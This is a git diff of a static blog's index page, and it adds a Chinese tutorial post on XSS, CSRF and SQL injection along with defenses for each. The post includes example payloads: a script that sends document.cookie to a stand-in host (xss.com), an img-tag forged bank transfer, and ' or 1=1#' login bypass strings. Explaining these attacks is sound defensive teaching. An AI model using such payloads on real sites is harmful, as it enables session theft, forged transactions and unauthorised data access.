@@ -214,6 +214,162 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-常见的Web安全及其攻防姿势" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/04/01/常见的Web安全及其攻防姿势/">常见的Web安全及其攻防姿势</a>
+    </h1>
+  
+
+
+
+  <a href="javascript:;" class="archive-article-date">
+      <i class="icon-smile icon"></i> 阅读数:<span id="/2019/04/01/常见的Web安全及其攻防姿势/" class="pageViews">0</span>次
+  </a>
+
+        
+        <a href="/2019/04/01/常见的Web安全及其攻防姿势/" class="archive-article-date">
+  	<time datetime="2019-03-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-01</time>
+</a>
+        
+      </header>
+    
+    <!-- 目录内容 -->
+    
+    <!-- 目录内容结束 -->
+    <div class="article-entry blog-check" itemprop="articleBody">
+      
+        <p>总结一下Web相关的安全攻防知识，让自己对这个知识点多一点了解，下面来聊聊Web中最常见的几种安全问题，包括攻击类型、原理以及怎样防御等。</p>
+<h3 id="1、XSS漏洞"><a href="#1、XSS漏洞" class="headerlink" title="1、XSS漏洞"></a>1、XSS漏洞</h3><blockquote>
+<p>XSS(Cross Site Scripting)跨站脚本攻击，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，往Web页面中插入了恶意的script代码，当用户浏览该页面时，嵌入Web页面中的script代码便会执行，从而达到恶意攻击用户的目的。</p>
+</blockquote>
+<p>原因：过于信任客户端提交的数据。<br>XSS攻击也可以简单分为两种，一种是利用url引诱客户点击来实现；另一种是通过存储到数据库，在其它用户获取相关信息时来执行脚本。</p>
+<h4 id="emsp-1）非持久型XSS（反射型XSS）"><a href="#emsp-1）非持久型XSS（反射型XSS）" class="headerlink" title="&emsp;1）非持久型XSS（反射型XSS）"></a>&emsp;1）非持久型XSS（反射型XSS）</h4><blockquote>
+<p>主要通过利用系统反馈行为漏洞，并欺骗用户主动触发，从而发起Web攻击，如盗取用户信息或其他侵犯用户隐私安全等，一般是通过别人发送的带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数会被HTML解析、执行。一般容易出现在搜索页面。</p>
+</blockquote>
+<p>  过程图如下：<br>  <img src="images/technology/XSS.png" alt="非持久型XSS过程"><br>  <strong><em>e.g1：</em></strong></p>
+<p>  正常发送消息：<br><br>  <a href="http://www.test.com/message.php?send=Hello,World！" target="_blank" rel="noopener">www.test.com/message.php?send=Hello,World！</a><br><br>  接收者将会接收信息并显示Hello,Word<br><br>  非正常发送消息：<br><br>  <a href="http://www.test.com/message.php?send=" target="_blank" rel="noopener">www.test.com/message.php?send=</a><script>alert(‘foolish!’)</script>！<br><br>  接收者接收消息显示的时候将会弹出警告窗口<br></p>
+<p>  <strong><em>e.g2：</em></strong></p>
+<p>  如果某网站上页面中有一个文本框，输入后作为参数跳转另一个地址:<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">'keywords'</span> value=<span class="string">""</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>  在页面上输入如下代码：&lt;script&gt;window.location.href=’<a href="http://www.xss.com?cookie=&#39;" target="_blank" rel="noopener">www.xss.com?cookie=&#39;</a> + document.cookie&lt;/script&gt;</p>
+<p>  或者直接让用户访问该网站地址，而keywords参数为”\&lt;script\&gt;window.location.href=’<a href="http://www.xss.com?cookie=&#39;" target="_blank" rel="noopener">www.xss.com?cookie=&#39;</a> + document.cookie\&lt;/script\&gt;”</p>
+<p>  如果受骗的用户刚好已经登录过该网站，那么，用户的登录cookie信息就已经发到了攻击者的服务器(xss.com)了。</p>
+<p>  如何防范：</p>
+<p>  1）只允许用户输入我们期望的数据。<br><br>  2）Web页面渲染的所有内容或者渲染的数据都必须来自于服务端，不要信任用户的输入内容。<br><br>  3）尽量不要使用eval, new Function()等可执行字符串的方法。<br><br>  4）前端渲染的时候对任何的字段都需要做encode转义编码。<br><br>  5）过滤或移除特殊的Html标签。<br><br>  6）将重要的cookie标记为http only。<br></p>
+<h4 id="emsp-2）持久型XSS（储存型XSS）"><a href="#emsp-2）持久型XSS（储存型XSS）" class="headerlink" title="&emsp;2）持久型XSS（储存型XSS）"></a>&emsp;2）持久型XSS（储存型XSS）</h4><blockquote>
+<p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie(虽然还有种DOM型XSS，但是也还是包括在存储型XSS内)，不需要诱骗用户点击。</p>
+</blockquote>
+<p>  <strong><em>e.g:</em></strong></p>
+<p>  留言板表单中的表单域：<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=“text” name=“content” value=“这里是用户填写的数据”&gt;</span><br></pre></td></tr></table></figure></p>
+<p>  正常操作：<br><br>  用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。<br><br>  非正常操作：<br><br>  攻击者在value填写&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;；<br><br>  将数据存储到数据库中；<br><br>  其他用户取出数据显示的时候，将会执行这些攻击性代码。<br></p>
+<p>  如何防范：</p>
+<p>  1）后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理。<br><br>  2）后端在输出给前端数据统一进行转义处理。<br><br>  3）前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。<br></p>
+<blockquote>
+</blockquote>
+<p>如何防范：对于一切用户的输入、输出、客户端的输出内容视为不可信，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。</p>
+<h3 id="2、CSRF攻击"><a href="#2、CSRF攻击" class="headerlink" title="2、CSRF攻击"></a>2、CSRF攻击</h3><blockquote>
+<p>CSRF(Cross-site request forgery)跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行(因此对其进行防范的资源也相当稀少)和难以防范，所以被认为比XSS更具危险性。但往往同XSS一同作案!</p>
+</blockquote>
+<p>例如，当用户登录网络银行去查看其存款余额，在他没有退出时，就点击了一个QQ好友发来的链接，那么该用户银行帐户中的资金就有可能被转移到攻击者指定的帐户中。</p>
+<p>CSRF攻击必须要有三个条件 :</p>
+<p>1）用户已经登录了站点A，并在本地记录了cookie。<br><br>2）在用户没有登出站点A的情况下（也就是cookie生效的情况下），访问了恶意攻击者提供的引诱危险站点B(B站点要求访问站点A)。<br><br>3）站点A没有做任何CSRF防御。<br></p>
+<p>  过程图如下：<br>  <img src="images/technology/CSRF.png" alt="CSRF攻击过程"><br>  <strong><em>e.g1:</em></strong></p>
+<p>  一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问：<br>  example.com/bbs/create_post.php?title=标题&amp;content=内容</p>
+<p>  那么，我只需要在论坛中发一帖，包含一链接：<br>  example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈</p>
+<p>  只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。<br>  <strong><em>e.g2:</em></strong></p>
+<p>  银行网站A，它以GET请求来完成银行转账的操作，如：<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000" target="_blank" rel="noopener">www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a><br>  危险网站B，它里面有一段HTML的代码如下<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>  首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块……</p>
+<p>  为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作....." target="_blank" rel="noopener">www.mybank.com/Transfer.php?toBankId=11&amp;money=1000，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作.....</a>.</p>
+<p>  为了杜绝上面的问题，银行决定改用POST请求完成转账操作，如果银行后台使用了$_REQUEST去获取请求的数据，而危险网站B，仍然只是包含那句一模一样的HTML代码，结果你的银行账户依然少了1000块。</p>
+<p>  原因是银行后台使用了\$_REQUEST去获取请求的数据，而\$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用\$_GET和\$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。</p>
+<p>  如何防范：<br>  在业界目前防御CSRF攻击主要有三种策略：验证HTTP Referer字段;在请求地址中添加token并验证;在HTTP头中自定义属性并验证。同时尽量使用POST，限制GET。下面就分别对这三种策略进行详细介绍:</p>
+<p>  1）验证HTTP Referer字段</p>
+<p>  利用HTTP头中的Referer判断请求来源是否合法。<br><br>  优点：简单易行，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。<br><br>  缺点：<br><br>  （1）Referer 的值是由浏览器提供的，不可全信，低版本浏览器下Referer存在伪造风险。<br><br>  （2）用户自己可以设置浏览器使其在发送请求时不再提供Referer时，网站将拒绝合法用户的访问。<br></p>
+<p>  2）在请求地址中添加token并验证</p>
+<p>  在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie之中，以HTTP请求参数的形式加入一个随机产生的token交由服务端验证。<br><br>  优点：比检查Referer要安全一些，并且不涉及用户隐私。<br><br>  缺点：对所有请求都添加token比较困难，难以保证token本身的安全，依然会被利用获取到token。<br></p>
+<p>  3）在HTTP头中自定义属性并验证+One-Time Tokens</p>
+<p>  将token放到HTTP头中自定义的属性里。通过XMLHttpRequest的异步请求交由后端校验，并且一次有效。<br><br>  优点：统一管理token输入输出，可以保证token的安全性。<br><br>  缺点：有局限性，无法在非异步的请求上实施。<br></p>
+<h3 id="3、SQL注入"><a href="#3、SQL注入" class="headerlink" title="3、SQL注入"></a>3、SQL注入</h3><blockquote>
+<p>通过将外部的输入直接嵌入到需要执行的SQL语句中，从而可能获取数据库中的敏感信息，或者利用数据库的特性执行一些恶意操作，甚至可能会获取数据库乃至系统用户的最高权限。</p>
+</blockquote>
+<p>原因：程序没有转义过滤用户输入的内容，导致攻击者可以向服务器提交恶意的代码，从而使得程序在执行SQL语句时，将攻击者输入的代码作为SQL语句的一部分执行，导致原逻辑被改变，执行了攻击者的恶意代码。</p>
+<p>例如:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select * from user where id="</span>.$id;</span><br></pre></td></tr></table></figure></p>
+<p>上面的例子是查询某个信息，服务端直接用用户输入的变量\$id来拼接SQL语句，而执行该语句，存在安全隐患，如果$id=’2 or 1==1’，便能轻易的获取user表的任意信息。</p>
+<p><strong><em>e.g1：</em></strong></p>
+<p>比如，我们要访问某一个帖子的信息，会通过调用类似于<a href="https://www.xxx.xx/news/read?pid=50这样的接口来获取信息，这样的话可能就会导致SQL注入，通过上面的地址可以推断出服务端中执行的SQL是：" target="_blank" rel="noopener">https://www.xxx.xx/news/read?pid=50这样的接口来获取信息，这样的话可能就会导致SQL注入，通过上面的地址可以推断出服务端中执行的SQL是：</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> [表名] where pid=<span class="number">50</span>;</span><br></pre></td></tr></table></figure></p>
+<p>如果我们在参数后面拼接上一些其他的信息作为参数一部分，便可能导致SQL数据发生改变，如添加” and 1=2”后SQL语句将变为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> [表名] where pid=<span class="number">50</span> and <span class="number">1</span>=<span class="number">2</span>; <span class="comment">// 1=2不成立</span></span><br></pre></td></tr></table></figure></p>
+<p>从而会导致返回出错。</p>
+<p><strong><em>e.g2：</em></strong></p>
+<p>  再比如，在一个登陆界面中，需要传入用户名和密码进行登录验证，正常情况下，传给服务端的用户名和密码数据被合成到SQL查询语句中后应该是这样的：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where username=[用户名] and password=md5([密码])</span><br></pre></td></tr></table></figure></p>
+<p>此时，如果用户在用户名中输入” or 1=1#”，密码随便输入，便可以登录。因为此时的SQL语句为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where username=<span class="string">" or 1=1#"</span> and password=md5(<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
+<p>而”#”在mysql中是注释符，这样#号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where username=<span class="string">''</span> or <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>因为1=1永远都是成立的，即where子句总是为真，将该sql进一步简化之后，等价如下select语句：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure></p>
+<p>导致的最终结果是该sql语句的作用是检索users表中的所有字段，从而能够登录成功。<br>如何防范：对用户输入的那些变量进行优化过滤，不要信任用户传入的数据。</p>
+<h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>XSS攻击的本质就是，利用一切手段在目标用户的浏览器中执行攻击脚本，而CSRF则是攻击者盗用了你的身份，以你的名义发送恶意请求。<br>因此，不管是客户端还是服务端，都不要信任双方传来的数据，最好都进行过滤转义等处理，总之，绝不可以信任任何客户端提交的数据！！！</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/04/01/常见的Web安全及其攻防姿势/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+<script>
+  $('.blog-check img').zoomify();
+</script>
+  
     <article id="post-JS常见设计模式总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -330,6 +486,10 @@
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">design</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">设计模式</a>
         		</li>
       		
 		</ul>
@@ -521,11 +681,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cli</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">javascript</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">javascript</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cli</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -757,6 +917,102 @@
   $('.blog-check img').zoomify();
 </script>
   
+    <article id="post-记录苏州之行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/17/记录苏州之行/">记录·苏州之行</a>
+    </h1>
+  
+
+
+
+  <a href="javascript:;" class="archive-article-date">
+      <i class="icon-smile icon"></i> 阅读数:<span id="/2018/05/17/记录苏州之行/" class="pageViews">0</span>次
+  </a>
+
+        
+        <a href="/2018/05/17/记录苏州之行/" class="archive-article-date">
+  	<time datetime="2018-05-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-17</time>
+</a>
+        
+      </header>
+    
+    <!-- 目录内容 -->
+    
+    <!-- 目录内容结束 -->
+    <div class="article-entry blog-check" itemprop="articleBody">
+      
+        <p>&nbsp;&nbsp;不得不说，时间过得真的很快，转眼间已周五，离上周苏州之行也已近一周，一直以来，我都很少写博客，也许这是第一篇生活记录类博客，也正好借此记录下此次的苏州之行，给以后有此类想法的朋友一些借鉴，虽说我不是那种习惯性经常写此类博客的人，但是偶尔抽空记录下生活，还是很有必要的，也是一种意义，我个人觉得，虽不说可以做到“下笔如有神”，但也不失为一种生活方式的体现，亦是一种生活态度。<br>
+        
+          <a class="article-more-a" href="/2018/05/17/记录苏州之行/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">苏州</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旅行</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">风景</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/05/17/记录苏州之行/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+<script>
+  $('.blog-check img').zoomify();
+</script>
+  
     <article id="post-vue插件之轮播" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -825,102 +1081,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/05/17/vue插件之轮播/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-<script>
-  $('.blog-check img').zoomify();
-</script>
-  
-    <article id="post-记录苏州之行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/17/记录苏州之行/">记录·苏州之行</a>
-    </h1>
-  
-
-
-
-  <a href="javascript:;" class="archive-article-date">
-      <i class="icon-smile icon"></i> 阅读数:<span id="/2018/05/17/记录苏州之行/" class="pageViews">0</span>次
-  </a>
-
-        
-        <a href="/2018/05/17/记录苏州之行/" class="archive-article-date">
-  	<time datetime="2018-05-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-17</time>
-</a>
-        
-      </header>
-    
-    <!-- 目录内容 -->
-    
-    <!-- 目录内容结束 -->
-    <div class="article-entry blog-check" itemprop="articleBody">
-      
-        <p>&nbsp;&nbsp;不得不说，时间过得真的很快，转眼间已周五，离上周苏州之行也已近一周，一直以来，我都很少写博客，也许这是第一篇生活记录类博客，也正好借此记录下此次的苏州之行，给以后有此类想法的朋友一些借鉴，虽说我不是那种习惯性经常写此类博客的人，但是偶尔抽空记录下生活，还是很有必要的，也是一种意义，我个人觉得，虽不说可以做到“下笔如有神”，但也不失为一种生活方式的体现，亦是一种生活态度。<br>
-        
-          <a class="article-more-a" href="/2018/05/17/记录苏州之行/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">苏州</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旅行</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">风景</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/05/17/记录苏州之行/">展开全文 >></a>
         </p>
       
 
@@ -1150,99 +1310,10 @@
   $('.blog-check img').zoomify();
 </script>
   
-    <article id="post-welcome" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/24/welcome/">Hi， Welcome to my blog</a>
-    </h1>
-  
-
-
-
-  <a href="javascript:;" class="archive-article-date">
-      <i class="icon-smile icon"></i> 阅读数:<span id="/2018/04/24/welcome/" class="pageViews">0</span>次
-  </a>
-
-        
-        <a href="/2018/04/24/welcome/" class="archive-article-date">
-  	<time datetime="2018-04-23T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-24</time>
-</a>
-        
-      </header>
-    
-    <!-- 目录内容 -->
-    
-    <!-- 目录内容结束 -->
-    <div class="article-entry blog-check" itemprop="articleBody">
-      
-        <p>This is my first blog on github from Blog Park, I’ll sharing technology blog irregularlly and discuss problems together.</p>
-<h3 id="分享一个面试题"><a href="#分享一个面试题" class="headerlink" title="分享一个面试题"></a>分享一个面试题</h3><p>// 编写一个javscript函数 fn，该函数有一个参数 n（数字类型），其返回值是一个数组，该数组内是 n 个随机且不重复的整数，且整数取值范围是 [2, 32]。</p>
-        
-          <a class="article-more-a" href="/2018/04/24/welcome/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">welcome</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">intoduction</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/24/welcome/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-<script>
-  $('.blog-check img').zoomify();
-</script>
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 
 
@@ -1397,11 +1468,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">cli</a>
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color2">design</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">cli</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1417,15 +1496,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">插件</a>
+                <a href="javascript:void(0)" class="js-tag color4">template</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">轮播</a>
+                <a href="javascript:void(0)" class="js-tag color4">AST</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">滚动</a>
+                <a href="javascript:void(0)" class="js-tag color3">源码</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">readline</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1434,10 +1517,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">intoduction</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">readline</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1457,6 +1536,26 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">插件</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">轮播</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">滚动</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">苏州</a>
               </li>
              
@@ -1466,22 +1565,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">风景</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">template</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">AST</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">源码</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">design</a>
               </li>
             
             <div class="clearfix"></div>
